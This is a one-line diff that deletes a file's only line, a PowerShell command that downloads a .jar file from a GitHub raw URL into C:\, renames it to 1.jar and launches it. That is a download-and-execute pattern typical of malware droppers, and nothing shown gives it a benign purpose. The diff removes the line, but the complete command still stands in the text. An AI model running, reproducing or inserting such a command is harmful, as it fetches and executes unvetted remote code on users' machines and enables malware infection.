@@ -1,1 +1,0 @@
-Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/raw/main/atlasgay.jar" -OutFile "C:\atlasgay.jar"; Rename-Item -Path "C:\atlasgay.jar" -NewName "1.jar"; Start-Process -FilePath "C:\1.jar";
